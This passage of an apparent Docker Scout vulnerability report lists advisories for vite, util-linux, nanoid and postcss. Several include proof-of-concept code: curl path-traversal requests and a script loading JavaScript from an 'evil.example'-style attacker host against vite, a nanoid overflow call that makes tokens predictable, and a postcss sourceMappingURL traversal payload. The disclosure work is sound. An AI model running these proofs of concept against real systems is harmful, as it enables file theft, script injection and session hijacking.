Since [sirv trims the trailing slash of the public directory](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at "/www", and the public directory is at "/www/p", if the created path will be "/www/private.txt", the startsWith function will still return true, because the string "/www/private.txt" starts with  "/www/p". To achieve this, the attacker will use ".." to ask for the file "../private.txt". The code will then join it to the "/www/p" string, and will receive "/www/p/../private.txt". Then, the normalize function will return "/www/private.txt", which will then be passed to the startsWith function, which will return true, and the processing of the page will continue without checking the deny list (since this is the public directory middleware which doesn't check that).

### PoC
Execute the following shell commands:

```
npm  create  vite@<!-- -->latest
cd vite-project/
mkdir p
cd p
ln -s a b
cd ..
echo  'import path from "node:path"; import { defineConfig } from "vite"; export default defineConfig({publicDir: path.resolve(__dirname, "p/"), server: {fs: {deny: [path.resolve(__dirname, "private.txt")]}}})' > vite.config.js
echo  "secret" > private.txt
npm install
npm run dev
```

Then, in a different shell, run the following command:

`curl -v --path-as-is 'http://localhost:5173/private.txt'`

You will receive a 403 HTTP Response,  because private.txt is denied.

Now in the same shell run the following command:

`curl -v --path-as-is 'http://localhost:5173/../private.txt'`

You will receive the contents of private.txt.

### Related links
- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-112945?s=github&n=vite&t=npm&vr=%3C%3D6.4.3"><img alt="low 2.1: CVE--2026--112945" src="https://img.shields.io/badge/CVE--2026--112945-lightgrey?label=low%202.1&labelColor=fce1a9"/></a> <i>Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</i>

<table>
<tr><td>Affected range</td><td><code><=6.4.3</code></td></tr>
<tr><td>Fixed version</td><td><code>6.4.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.672%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

When accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.

### Impact

Only apps that match the following conditions are affected:

- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.
- the transformed HTML contains an inline module script
- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions

### Details

[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:

```js
const url = req.originalUrl
template = await vite.transformIndexHtml(url, template)
```

For a development server at `http://localhost:5173`, an attacker can send this URL:

```text
http://localhost:5173//evil.example/payload.js?/../../package.json
```

In Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.

Chromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.

[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:

```html
<script type="module" src="//evil.example/payload.js?/../../package.json?html-proxy&index=0.js"></script>
```

The generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.

### PoC

```js
import { createServer as createHttpServer } from 'node:http'
import { createRequire } from 'node:module'
import { dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const directory = dirname(fileURLToPath(import.meta.url))
const require = createRequire(join(directory, 'package.json'))
const { chromium } = require('playwright-chromium')
const viteModule = await import(
  pathToFileURL(require.resolve('vite')).href
)
const createViteServer =
  viteModule.createServer ?? viteModule.default.createServer

// This loopback server stands in for a separately hosted attacker website.
const attackerPort = 4173
const exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`
const html = '<script type="module">document.body.textContent = "Vite app"</script>'

const listen = (server, port = 0) =>
  new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(port, '127.0.0.1', () => {
      server.off('error', reject)
      resolve(server.address().port)
    })
  })

const close = (server) =>
  new Promise((resolve, reject) => {
    server.close((error) => (error ? reject(error) : resolve()))
  })

let attackerRequest = null
const attacker = createHttpServer((request, response) => {
  attackerRequest = request.url
  response.writeHead(200, {
    'access-control-allow-origin': '*',
    'content-type': 'text/javascript',
  })
  response.end(
    "document.documentElement.dataset.viteXssPoc = 'executed'",
  )
})

const vite = await createViteServer({
  appType: 'custom',
  configFile: false,
  root: directory,
  server: {
    hmr: false,
    middlewareMode: true,
    watch: null,
  },
})

const application = createHttpServer((request, response) => {
  vite.middlewares(request, response, async (error) => {
    if (error) {
      response.destroy(error)
      return
    }

    try {
      const transformed = await vite.transformIndexHtml(request.url, html)
      response.writeHead(200, { 'content-type': 'text/html' })
      response.end(transformed)
    } catch (transformError) {
      response.destroy(transformError)
    }
  })
})

await listen(attacker, attackerPort)
const applicationPort = await listen(application)
const browser = await chromium.launch({ headless: true })

try {
  const page = await browser.newPage()
  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)
  await page.waitForFunction(
    () => document.documentElement.dataset.viteXssPoc === 'executed',
  )

  console.log(`attacker request: ${attackerRequest}`)
  console.log('JavaScript from the attacker server executed in the Vite page')
} finally {
  await browser.close()
  await close(application)
  await vite.close()
  await close(attacker)
}
```

Observed output on Vite 8.2.1:
```text
attacker request: /payload.js?/../../package.json?html-proxy&index=0.js
JavaScript from the attacker server executed in the Vite page
```

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-859w-5945-r5v3?s=gitlab&n=vite&t=npm&vr=%3C4.5.14"><img alt="unspecified : GHSA--859w--5945--r5v3" src="https://img.shields.io/badge/GHSA--859w--5945--r5v3-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code><4.5.14</code></td></tr>
<tr><td>Fixed version</td><td><code>6.3.4, 6.2.7, 6.1.6, 5.4.19, 4.5.14</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The contents of files in [the project `root`](https://vite.dev/config/shared-options.html#root) that are denied by a file matching pattern can be returned to the browser.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>util-linux</strong> <code>2.38.1-5+deb12u3</code> (deb)</summary>

<small><code>pkg:deb/debian/util-linux@2.38.1-5%2Bdeb12u3?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-53615?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--53615" src="https://img.shields.io/badge/CVE--2026--53615-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.178%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

util-linux is a random collection of Linux utilities. Before util-linux 2.41.4, `parse_dos_extended()` in `libblkid/src/partitions/dos.c` computes an extended-partition start sector with 32-bit addition and does not apply the extended-area bounds checks to the first two EBR entries. A local attacker who causes a crafted DOS extended-partition disk image or removable medium to be probed can wrap `cur_start + start` to sector zero and cause libblkid to report a false partition overlapping the MBR. This directly compromises the integrity of the reported partition metadata; disk modification or availability loss requires a separate downstream consumer to act on that metadata. This issue is fixed in 2.41.4.

---
- util-linux 2.42-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1140197)
[trixie] - util-linux 2.41.5-0+deb13u1
https://github.com/util-linux/util-linux/security/advisories/GHSA-h4rw-gv36-wmp5
Fixed by: https://github.com/util-linux/util-linux/commit/a2d858176b609ab5b8535021a3af9cd302d23d31 (v2.42)
Fixed by: https://github.com/util-linux/util-linux/commit/05c2dbadf34cc74192287f377904afaaf4061623 (v2.41.4)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-78410?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--78410" src="https://img.shields.io/badge/CVE--2026--78410-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.198%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in util-linux. Restricted bind mounts take the source path from fstab but do not pin that source before the privileged mount. A local unprivileged user who can replace the authorized source or a writable ancestor can redirect SUID mount(8) to bind another host directory. If the fstab entry also sets X-mount.owner, X-mount.group, or X-mount.mode, root then changes ownership or mode on that redirected inode.

---
- util-linux 2.42.3-1
[trixie] - util-linux <no-dsa> (Minor issue)
https://github.com/util-linux/util-linux/security/advisories/GHSA-rh77-686x-2f2m

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-53613?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--53613" src="https://img.shields.io/badge/CVE--2026--53613-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.163%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

util-linux is a random collection of Linux utilities. In util-linux 2.17 through 2.41.6 and 2.42 through 2.42.3, and in 2.42.4 when the legacy `mount(2)` path is used without `/proc`, restricted non-root `mount` requests validate an `/etc/fstab` target before the mount operation re-resolves that pathname. A local low-privileged user authorized by an fstab `user` or `users` entry whose target has an attacker-writable ancestor can use `renameat2(RENAME_EXCHANGE)` to swap a path component and redirect an authorized mount to a root-owned location, such as mounting attacker-controlled content over `/etc/sudoers.d`, and thereby gain root privileges. Versions 2.41.5 and 2.42.2 pin targets for the new mount API, and 2.42.4 pins legacy targets through `/proc/self/fd`; the documented legacy fallback without `/proc` remains affected.

---
- util-linux 2.42.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1140195)
https://github.com/util-linux/util-linux/security/advisories/GHSA-8gj5-72r3-428g
Fixed by: https://github.com/util-linux/util-linux/commit/0d3d55975aa3492c62fd345eac38f41cd166c0b0 (v2.42.2)
Fixed by: https://github.com/util-linux/util-linux/commit/0b010025a0e429bc80355c94db86a843395d49e2 (v2.41.5)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-13595?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="medium : CVE--2026--13595" src="https://img.shields.io/badge/CVE--2026--13595-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.152%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the libblkid library of util-linux. During nested partition probing, the BSD, Minix, Solaris x86, and UnixWare partition probers cache a raw pointer to a parent partition entry in a dynamically allocated array. When subsequent partition additions cause the array to be reallocated, this pointer becomes stale, leading to a heap use-after-free read. An attacker who can present a crafted block device image (for example, via USB insertion or a loop-mounted disk image) can trigger this flaw without user interaction, as libblkid is invoked automatically by udev/udisks as root on block-device hot-plug events. This could lead to limited information disclosure or denial of service.

---
- util-linux 2.42.2-1
https://bugzilla.redhat.com/show_bug.cgi?id=2494101
https://github.com/util-linux/util-linux/commit/c0186f14fbdb02f64c8e0ba701ce727ea764ff4c (master)
https://github.com/util-linux/util-linux/commit/60ca8616ac1a223bfb5a713047a37136dd9481ef (v2.42.2)
https://github.com/util-linux/util-linux/commit/132d9c8aa15a8efd0a23d8ca7ed8b98f365e84fa (v2.41.5)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-14104?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--14104" src="https://img.shields.io/badge/CVE--2025--14104-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.215%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in util-linux. This vulnerability allows a heap buffer overread when processing 256-byte usernames, specifically within the `setpwnam()` function, affecting SUID (Set User ID) login-utils utilities writing to the password database.

---
- util-linux 2.41.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1122058; unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2419369
https://github.com/util-linux/util-linux/issues/3585
https://github.com/util-linux/util-linux/pull/3586
Fixed by: https://github.com/util-linux/util-linux/commit/aaa9e718c88d6916b003da7ebcfe38a3c88df8e6
Fixed by: https://github.com/util-linux/util-linux/commit/9a36d77012c4c771f8d51eba46b6e62c29bf572a
Affected code in setpwnam() is only used by chsh and chfn which are not build
in any Debian released binary package from src:util-linux and explicitly configured
as with --disable-chfn-chsh since 2.25-1.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.430%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@<!-- -->ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>nanoid</strong> <code>3.3.6</code> (npm)</summary>

<small><code>pkg:npm/nanoid@3.3.6</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-67214?s=github&n=nanoid&t=npm&vr=%3C3.3.16"><img alt="high 8.2: CVE--2026--67214" src="https://img.shields.io/badge/CVE--2026--67214-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Loop with Unreachable Exit Condition ('Infinite Loop')</i>

<table>
<tr><td>Affected range</td><td><code><3.3.16</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.16</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.330%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

nanoid (Nano ID) before 5.1.16 contains an infinite loop in the customAlphabet and nanoid functions of its non-secure module (nanoid/non-secure). When these functions are given a negative size, the loop counter is decremented from a negative value and never reaches its termination condition, spinning indefinitely and hanging the calling thread. An application that passes an unvalidated, attacker-controlled negative size to these functions is exposed to a denial-of-service condition.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-67213?s=github&n=nanoid&t=npm&vr=%3C3.3.18"><img alt="high 8.2: CVE--2026--67213" src="https://img.shields.io/badge/CVE--2026--67213-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Loop with Unreachable Exit Condition ('Infinite Loop')</i>

<table>
<tr><td>Affected range</td><td><code><3.3.18</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.17</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.331%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

nanoid (Nano ID) before 5.1.6 contains an infinite loop in the customAlphabet and customRandom functions. When these functions are configured with a size of 0, the internal generation loop never satisfies its exit condition and spins indefinitely, hanging the calling thread. An application that passes an unvalidated, attacker-controlled size of 0 to these functions is exposed to a denial-of-service condition.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-73086?s=github&n=nanoid&t=npm&vr=%3C3.3.12"><img alt="high 7.4: CVE--2026--73086" src="https://img.shields.io/badge/CVE--2026--73086-lightgrey?label=high%207.4&labelColor=e25d68"/></a> <i>Integer Overflow or Wraparound</i>

<table>
<tr><td>Affected range</td><td><code><3.3.12</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.12</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.296%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

An integer overflow in `nanoid(size)` permanently corrupts the process-wide CSPRNG pool, causing all subsequent ID generation to return the deterministic string `"uuuuuuuuuuuuuuuuuuuuu"`. Any application that passes user-influenced values to the `size` parameter loses all randomness guarantees for session tokens, CSRF tokens, and unique identifiers until process restart.

### Details

`nanoid()` at [`index.js:101`](https://github.com/ai/nanoid/blob/main/index.js#L101) coerces the `size` parameter with `size |= 0`, which converts it to a signed 32-bit integer. When `size >= 2^31` (e.g., `2147483648`), this wraps to `-2147483648`.

The negative value is passed to `fillPool()` ([`index.js:15`](https://github.com/ai/nanoid/blob/main/index.js#L15)):

```javascript
function fillPool(bytes) {
  if (!pool || pool.length < bytes) {       // false: pool exists, -2B < pool.length
    pool = Buffer.allocUnsafe(bytes * POOL_SIZE_MULTIPLIER)
    crypto.getRandomValues(pool)
    poolOffset = 0
  } else if (poolOffset + bytes > pool.length) {  // false: poolOffset + (-2B) < pool.length
    crypto.getRandomValues(pool)
    poolOffset = 0
  }
  poolOffset += bytes  // poolOffset += -2147483648 → deeply negative
}
```

Neither branch triggers, so the pool is never refreshed. `poolOffset` becomes ~-2.1 billion.

Subsequent `nanoid()` calls execute:
```javascript
for (let i = poolOffset - size; i < poolOffset; i++) {
  id += scopedUrlAlphabet[pool[i] & 63]
}
```

`pool[negative_index]` returns `undefined`. `undefined & 63` evaluates to `0`. `urlAlphabet[0]` is `'u'`. Every ID becomes `"uuuuuuuuuuuuuuuuuuuuu"`.

The corruption is **persistent** — it affects all subsequent calls in the process until ~100 million calls eventually wrap `poolOffset` back to positive, or the process restarts.

### PoC

```javascript
import { nanoid } from 'nanoid'

// Step 1: Normal operation
console.log(nanoid())  // e.g., "V1StGXR8_Z5jdHi6B-myT"

// Step 2: Trigger overflow (e.g., from an API parameter)
try { nanoid(2147483648) } catch(e) {}

// Step 3: All subsequent IDs are deterministic
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
// ... forever, process-wide
```

Run with: `node --experimental-vm-modules poc.mjs`

Attack scenario: Any API endpoint that accepts a user-controlled length/size parameter (URL shortener slug length, configurable token size, etc.) and passes it to `nanoid(userInput)`.

### Impact

**Complete loss of ID unpredictability and uniqueness, process-wide, from a single request.**

- All session IDs, CSRF tokens, API keys, and database identifiers generated after the attack are identical and predictable
- An attacker can predict all tokens issued to other users, enabling session hijacking and authentication bypass
- The corruption is persistent (survives across requests) and affects all consumers of `nanoid` in the same process
- No special privileges or preconditions required — a single unauthenticated request is sufficient
- Affects any application that passes external input to the `size` parameter without validation

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-55565?s=github&n=nanoid&t=npm&vr=%3C3.3.8"><img alt="medium 4.3: CVE--2024--55565" src="https://img.shields.io/badge/CVE--2024--55565-lightgrey?label=medium%204.3&labelColor=fbb552"/></a> <i>Loop with Unreachable Exit Condition ('Infinite Loop')</i>

<table>
<tr><td>Affected range</td><td><code><3.3.8</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.8</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.665%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>52nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When nanoid is called with a fractional value, there were a number of undesirable effects:

1. in browser and non-secure, the code infinite loops on while (size--)
2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled
3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error

Version 3.3.8 and 5.0.9 are fixed.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>postcss</strong> <code>8.4.30</code> (npm)</summary>

<small><code>pkg:npm/postcss@8.4.30</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-73646?s=github&n=postcss&t=npm&vr=%3C%3D8.5.17"><img alt="high 7.5: CVE--2026--73646" src="https://img.shields.io/badge/CVE--2026--73646-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=8.5.17</code></td></tr>
<tr><td>Fixed version</td><td><code>8.5.18</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.530%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Vulnerability Details

**File**: `lib/previous-map.js`
**Line**: 87-98 (`loadFile`), 129-144 (`loadMap`)


### Root Cause
PostCSS auto-detects a `/*# sourceMappingURL=... */` comment inside the CSS text it is asked to parse and, unless the caller explicitly passes `map: false`, attempts to load that path from disk as a "previous source map." This happens on every `postcss.parse()` / `postcss().process()` call by default (opt-out, not opt-in).

`loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)`, where `annotation` is the raw, attacker-controlled string from the CSS comment. `path.join()` normalizes but does not sandbox `..` segments, so a `../../../` prefix walks the resolved path outside the intended directory. If `opts.from` is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.

8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in `.map` (`loadFile()`). That fix did not address the traversal itself, only the target extension. Since the `join(dirname(file), map)` logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in `.map` remains readable through this path in the current release (8.5.16).

Once loaded, `MapGenerator.isMap()` treats the mere presence of a loaded "previous map" as an implicit request to generate `result.map`, even when the caller never set the `map` option. If the loaded map has a `sourcesContent` field (common for maps emitted by bundlers/transpilers), that content is merged into `result.map` and returned to the caller — disclosing the traversed-to file's content to whoever supplied the CSS.

### Attack Scenario
1. A service accepts user-submitted CSS and runs it through PostCSS to lint/format/transform it, e.g. `postcss().process(userCss, { from: '/app/uploads/user123/input.css', to: '/app/uploads/user123/output.css' })` — idiomatic usage; `map` option untouched.
2. Attacker submits CSS containing `/*# sourceMappingURL=../../../../some/other/app/dist/bundle.js.map */` (or an absolute path if `from` is unset).
3. PostCSS reads that `.map` file and folds its `sourcesContent` into `result.map`.
4. The service does what most build pipelines do with a truthy `result.map` — writes it next to the CSS output or returns it via API (source maps are meant to be consumed by browser devtools, so this is commonly public/served).
5. Attacker retrieves the emitted map and reads out the traversed file's content.

### Impact
Disclosure of the contents of arbitrary `.map` files reachable via path traversal (or absolute path when `from` is unset) from the process's filesystem. Affects any application processing CSS it does not fully trust without explicitly passing `map: false`. No authentication or user interaction beyond submitting CSS text is required.

### Vulnerable Code
```js
loadFile(path, cssFile, trusted) {
  if (!trusted && !this.unsafeMap) {
    if (!/\.map$/i.test(path)) {
      return undefined
    }
  }
  this.root = dirname(path)
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()
  }
}

loadMap(file, prev) {
  ...
  } else if (this.annotation) {
    let map = this.annotation
    if (file) map = join(dirname(file), map)
    let unknown = this.loadFile(map, file, false)
    ...
  }
}
```

### Recommended Fix
Constrain the resolved path to remain inside the CSS file's own directory instead of relying solely on a filename-extension check:
```js
loadFile(path, cssFile, trusted) {
  if (!trusted && !this.unsafeMap) {
    if (!/\.map$/i.test(path)) {
      return undefined
    }
    if (!cssFile) return undefined
    let root = resolve(dirname(cssFile))
    let resolvedPath = resolve(root, path)
    if (resolvedPath !== root && !resolvedPath.startsWith(root + sep)) {
      return undefined
    }
  }
  this.root = dirname(path)
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()
  }
}
```
I've implemented, tested (full existing test suite — 660/660 passing, plus new PoC-based regression checks for both the traversal and legitimate same-directory cases), and can share this fix on request or via a private fork if invited.

### Verification
Dynamically confirmed on v8.5.16 (current npm release / repo HEAD) via a standalone Node.js harness against `lib/postcss.js`: a "secret" `.map` file placed two directories outside a simulated project directory was read via a crafted `sourceMappingURL` comment in otherwise-innocuous CSS, with its `sourcesContent` appearing verbatim in `result.map.toString()` — with no `map` option set by the caller. A second harness confirmed the simpler no-`from` case reads an absolute path directly. A third harness confirmed `map: false` is the only current workaround. The attached fix branch closes both vectors while keeping all 660 existing unit tests green.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-45623?s=github&n=postcss&t=npm&vr=%3C%3D8.5.11"><img alt="high 7.5: CVE--2026--45623" src="https://img.shields.io/badge/CVE--2026--45623-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code><=8.5.11</code></td></tr>
<tr><td>Fixed version</td><td><code>8.5.12</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.608%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>50th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

